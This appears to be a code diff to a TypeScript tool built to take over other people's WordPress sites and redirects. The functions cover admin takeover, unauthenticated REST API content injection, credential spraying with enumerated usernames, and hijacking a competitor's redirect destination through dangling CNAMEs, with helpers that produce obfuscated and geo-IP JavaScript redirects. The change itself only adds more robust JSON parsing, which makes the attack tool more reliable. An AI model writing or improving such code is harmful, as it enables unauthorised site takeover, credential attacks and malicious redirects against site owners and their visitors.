@@ -18,6 +18,19 @@
 import { fetchWithPoolProxy } from "./proxy-pool";
 import { generateGeoIpJsRedirect, generateObfuscatedJsRedirect } from "./wp-admin-takeover";
 
+/** Safe JSON parse — returns null if response is HTML or invalid JSON */
+async function safeJsonParse(resp: Response): Promise<any | null> {
+  try {
+    const text = await resp.text();
+    if (text.startsWith("<!DOCTYPE") || text.startsWith("<html") || text.startsWith("<head")) {
+      return null;
+    }
+    return JSON.parse(text);
+  } catch {
+    return null;
+  }
+}
+
 // ─── Types ───
 
 export interface RedirectDetectionResult {
@@ -692,7 +705,10 @@ async function takeoverViaWpAdmin(config: TakeoverConfig, detection: RedirectDet
     });
 
     if (pagesResp.status === 200) {
-      const pages = await pagesResp.json() as any[];
+      const pages = await safeJsonParse(pagesResp) as any[] | null;
+      if (!pages || !Array.isArray(pages)) {
+        return { success: false, method: "wp_admin_takeover", detail: "WP REST API returned non-JSON response" };
+      }
       
       for (const page of pages) {
         const pageUrl = page.link || "";
@@ -780,7 +796,10 @@ async function takeoverViaRestApi(config: TakeoverConfig, detection: RedirectDet
     });
 
     if (pagesResp.status === 200) {
-      const pages = await pagesResp.json() as any[];
+      const pages = await safeJsonParse(pagesResp) as any[] | null;
+      if (!pages || !Array.isArray(pages)) {
+        return { success: false, method: "rest_api_unauth", detail: "WP REST API returned non-JSON response" };
+      }
       
       for (const page of pages) {
         // Try unauthenticated content injection (old WP vulns)
@@ -1009,9 +1028,11 @@ async function takeoverViaCredentialSpray(config: TakeoverConfig, detection: Red
       signal: AbortSignal.timeout(10000),
     });
     if (usersResp.status === 200) {
-      const users = await usersResp.json() as any[];
-      for (const u of users) {
-        if (u.slug && !usernames.includes(u.slug)) usernames.push(u.slug);
+      const users = await safeJsonParse(usersResp) as any[] | null;
+      if (users && Array.isArray(users)) {
+        for (const u of users) {
+          if (u.slug && !usernames.includes(u.slug)) usernames.push(u.slug);
+        }
       }
     }
   } catch {}
@@ -1678,7 +1699,8 @@ async function hijackRedirectDestination(config: TakeoverConfig, detection: Redi
       headers: { 'Accept': 'application/dns-json' },
       signal: AbortSignal.timeout(8000),
     });
-    const dnsData = await dnsResp.json() as any;
+    const dnsData = await safeJsonParse(dnsResp) as any;
+    if (!dnsData) throw new Error('DNS API returned non-JSON');
 
     if (dnsData.Status === 3 || !dnsData.Answer || dnsData.Answer.length === 0) {
       // Domain has no DNS records — might be expired/available
@@ -1699,7 +1721,8 @@ async function hijackRedirectDestination(config: TakeoverConfig, detection: Redi
       headers: { 'Accept': 'application/dns-json' },
       signal: AbortSignal.timeout(8000),
     });
-    const cnameData = await cnameResp.json() as any;
+    const cnameData = await safeJsonParse(cnameResp) as any;
+    if (!cnameData) throw new Error('CNAME DNS API returned non-JSON');
 
     if (cnameData.Answer && cnameData.Answer.length > 0) {
       const cname = cnameData.Answer[0].data;
@@ -1708,7 +1731,8 @@ async function hijackRedirectDestination(config: TakeoverConfig, detection: Redi
         headers: { 'Accept': 'application/dns-json' },
         signal: AbortSignal.timeout(5000),
       });
-      const cnameCheckData = await cnameCheckResp.json() as any;
+      const cnameCheckData = await safeJsonParse(cnameCheckResp) as any;
+      if (!cnameCheckData) throw new Error('CNAME check DNS API returned non-JSON');
 
       if (cnameCheckData.Status === 3 || !cnameCheckData.Answer) {
         progress("destination_hijack", `🎯 Dangling CNAME detected: ${competitorDomain} → ${cname} (CNAME target has no records)`);
@@ -1750,8 +1774,8 @@ async function hijackRedirectDestination(config: TakeoverConfig, detection: Redi
           signal: AbortSignal.timeout(8000),
         });
         if (usersResp.status === 200) {
-          const users = await usersResp.json() as any[];
-          const usernames = users.map((u: any) => u.slug).filter(Boolean);
+          const users = await safeJsonParse(usersResp) as any[] | null;
+          const usernames = (users && Array.isArray(users)) ? users.map((u: any) => u.slug).filter(Boolean) : [];
           if (usernames.length > 0) {
             progress("destination_hijack", `📋 Found ${usernames.length} WP users on competitor destination: ${usernames.join(', ')}`);
           }
